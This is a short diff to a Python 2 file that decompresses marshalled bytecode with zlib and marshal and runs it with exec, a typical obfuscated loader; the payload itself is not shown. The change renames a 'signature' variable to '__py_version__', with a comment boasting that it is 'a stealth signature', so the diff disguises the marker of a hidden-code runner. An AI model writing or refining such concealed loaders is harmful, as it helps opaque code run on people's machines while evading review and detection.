@@ -1,4 +1,4 @@
-signature = "PY_2.6"
+__py_version__ = "PY_2.6" # haha bullshit, this is a stealth signature
 # -*- coding: utf-8 -*-
 
 import zlib
@@ -24,4 +24,4 @@ demarshal = marshal.loads(decompress)
 # exec
 exec demarshal
 
-signature = "PY_2.6"
+__py_version__ = "PY_2.6" # haha bullshit, this is a stealth signature
